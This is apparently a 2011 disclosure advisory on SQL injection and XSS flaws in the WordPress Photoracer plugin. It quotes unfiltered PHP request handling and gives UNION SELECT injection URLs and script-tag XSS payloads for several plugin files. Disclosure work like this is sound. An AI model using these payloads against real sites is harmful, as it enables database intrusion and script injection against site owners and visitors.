## WordPress Photoracer Plugin <= 1.0 Multiple XSS & SQLI Vulnerabilities
## Vulnerabilities:
## * XSS
## * SQL Injection
## Bug discovered by Pr0T3cT10n, <pr0t3ct10n@gmail.com>
## Date: 26/08/2011
## ISRAEL
##########################################################################
##          Author will be not responsible for any damage.
##########################################################################
 
## Vulnerable Code - mostvoted.php [15-22]:
15.if (isset($_REQUEST[&#039;pid&#039;]) || isset($_REQUEST[&#039;prid&#039;]))
16.     $postid = $_REQUEST[&#039;pid&#039;] ? $_REQUEST[&#039;pid&#039;] : $_REQUEST[&#039;prid&#039;];
17.if (isset($_REQUEST[&#039;p&#039;]))
18.     $p = $_REQUEST[&#039;p&#039;];
19.if ($postid == 0) exit;
20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
22.$out = $wpdb->get_row($q1);
 
## NOTE:
## As you can see there is no validation or any filter to variable $postid ($_REQUEST[&#039;pid&#039;] and $_REQUEST[&#039;prid&#039;]).
## See line 16. so you can inject sql query by using $postid;
## SQL Injection PoC:
http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
http://www.example.com/wp-content/plugins/photoracer/mostvoted.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
####################################################################################################################################################
 
## Vulnerable Code - mostviewed.php [15-22]:
15.if (isset($_REQUEST[&#039;pid&#039;]) || isset($_REQUEST[&#039;prid&#039;]))
16.     $postid = $_REQUEST[&#039;pid&#039;] ? $_REQUEST[&#039;pid&#039;] : $_REQUEST[&#039;prid&#039;];
17.if (isset($_REQUEST[&#039;p&#039;]))
18.     $p = $_REQUEST[&#039;p&#039;];
19.if ($postid == 0) exit;
20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
22.$out = $wpdb->get_row($q1);
 
## NOTE:
## As you can see there is no validation or any filter to variable $postid ($_REQUEST[&#039;pid&#039;] and $_REQUEST[&#039;prid&#039;]).
## See line 16. so you can inject sql query by using $postid;
## SQL Injection PoC:
http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
http://www.example.com/wp-content/plugins/photoracer/mostviewed.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
####################################################################################################################################################
 
## Vulnerable Code - crono.php [15-22]:
15.if (isset($_REQUEST[&#039;pid&#039;]) || isset($_REQUEST[&#039;prid&#039;]))
16.     $postid = $_REQUEST[&#039;pid&#039;] ? $_REQUEST[&#039;pid&#039;] : $_REQUEST[&#039;prid&#039;];
17.if (isset($_REQUEST[&#039;p&#039;]))
18.     $p = $_REQUEST[&#039;p&#039;];
19.if ($postid == 0) exit;
20.$q1 = "SELECT raceid, active_from, active_to, indexpath, name, headcontent, numphoto FROM ".
22.$out = $wpdb->get_row($q1);
 
## NOTE:
## As you can see there is no validation or any filter to variable $postid ($_REQUEST[&#039;pid&#039;] and $_REQUEST[&#039;prid&#039;]).
## See line 16. so you can inject sql query by using $postid;
## SQL Injection PoC:
http://www.example.com/wp-content/plugins/photoracer/crono.php?pid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
http://www.example.com/wp-content/plugins/photoracer/crono.php?prid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
####################################################################################################################################################
 
## Vulnerable Code - changefrom.php [31, 47-49]:
31.if (isset($_REQUEST[&#039;rid&#039;])) $rid = $_REQUEST[&#039;rid&#039;];
...........
48.//echo $pr_qlist."<br>\n";
49.$out = $wpdb->get_row($prq);
 
## NOTE:
## As you can see there is no validation or any filter to variable $rid ($_REQUEST[&#039;rid&#039;]).
## See line 31. so you can inject sql query by using $postid;
## SQL Injection PoC:
http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
####################################################################################################################################################
 
## Vulnerable Code - changefrom.php [31, 47-49]:
31.if (isset($_REQUEST[&#039;rid&#039;])) $rid = $_REQUEST[&#039;rid&#039;];
...........
48.//echo $pr_qlist."<br>\n";
49.$out = $wpdb->get_row($prq);
 
## NOTE:
## As you can see there is no validation or any filter to variable $rid ($_REQUEST[&#039;rid&#039;]).
## See line 31. so you can inject sql query by using $postid;
## SQL Injection PoC:
http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid=-1+UNION+SELECT+1,2,3,4,VERSION(),6,7
####################################################################################################################################################
 
 
## XSS PoC:
http://www.example.com/wp-content/plugins/photoracer/changefrom.php?rid="><script>alert(1);</script>
http://www.example.com/wp-content/plugins/photoracer/changeto.php?rid="><script>alert(1);</script>



